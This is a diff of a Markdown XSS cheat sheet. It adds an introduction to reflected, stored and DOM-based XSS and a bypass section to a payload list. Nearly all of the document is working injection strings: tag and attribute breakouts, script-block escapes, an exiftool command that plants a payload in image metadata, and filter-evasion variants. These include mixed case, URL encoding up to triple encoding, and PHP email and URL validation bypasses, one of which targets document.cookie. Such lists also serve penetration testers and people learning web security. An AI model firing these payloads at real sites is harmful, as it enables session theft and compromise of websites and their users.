@@ -1,4 +1,18 @@
 # XSS Cheat Sheet (Basic)
+
+## **Introduction**
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
+- Reflected XSS
+
+    Attack where the malicious script runs from another website through the web browser    
+- Stored XSS
+  
+    Stored attacks are those where the injected script is permanently stored on the target servers
+- DOM-Based XSS
+
+    A type of XSS that has payloads found in the DOM rather than within the HTML code.
+
+## **Payloads**
 1. Basic payload
 ```html
 <script>alert(1)</script>
@@ -37,7 +51,7 @@
 <!-- --><script>alert(1)</script> -->
 ```
 
-4. Add </tag> when the input inside or between opening/closing tags, tag can be <a>,<title,<script> and any other HTML tags
+4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
     
 ```html
 </tag><script>alert(1)</script>
@@ -70,7 +84,7 @@
 <input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
 ```
 
-6. Use </script> when input inside <script> tags
+6. Use </script> when input inside ```<script>``` tags
 ```html
 </script><script>alert(1)</script>
 ```
@@ -89,7 +103,7 @@
 </script>
 ```
 
-# XSS Cheat Sheet (Advanced)
+## **XSS Cheat Sheet (Advanced)**
 7. Use when input lands in a script block, inside a string delimited value.
 ```html
 '-alert(1)-'
@@ -271,4 +285,56 @@ $ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
 <a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
 ```
 > Add a "-->" to payload if input lands in a comment section
+
 > Add a "]]>" if input lands in a CDATA section
+
+## **XSS Cheat Sheet (Bypass)**
+19. Mixed Case
+```html
+<Script>alert(document.cookie)</Script> 
+```
+
+20. Unclosed Tags
+```html
+<svg onload="alert(1)"
+```
+
+21. Uppercase Payloads
+```html
+<SVG ONLOAD=ALERT(1)>
+```
+
+22. Encoded XSS
+```html
+(Encoded)
+%3Csvg%20onload%3Dalert(1)%3E 
+
+(Double Encoded)
+%253Csvg%2520onload%253Dalert%281%29%253E 
+
+(Triple Encoded)
+%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
+```
+
+23. JS Lowercased Input
+```html
+<SCRİPT>alert(1)</SCRİPT>
+```
+
+24. PHP Email Validation Bypass
+```html
+<svg/onload=alert(1)>"@gmail.com
+```
+
+25. PHP URL Validation Bypass
+```html
+javascript://%250Aalert(1)
+```
+
+26. Inside Comments Bypass
+```html
+<!--><svg onload=alert(1)-->
+```
+
+Reference:
+- [Brute Logic](https://brutelogic.com.br/)
